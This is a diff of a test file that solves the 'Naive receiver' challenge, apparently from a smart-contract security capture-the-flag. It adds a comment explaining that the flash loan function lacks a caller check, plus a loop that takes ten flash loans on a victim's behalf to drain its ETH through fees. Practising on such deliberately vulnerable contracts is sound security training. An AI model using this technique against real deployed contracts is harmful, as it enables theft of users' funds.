@@ -33,6 +33,12 @@ describe('[Challenge] Naive receiver', function () {
         // checks:
         // receiver eth is 0
         // this.pool has 1010 ETH
+        /*
+        Solution: Requesting loan for someone else since there's no check whhen
+        calling flash loan function. We bankrupt another user since anyone can
+        change the amount owed for someone else because there's no check on who's
+        calling the function when executing the flash loan.
+        */
         for(let i = 0; i < 10; i++) {
             await this.pool.flashLoan(this.receiver.address, 10)
         }
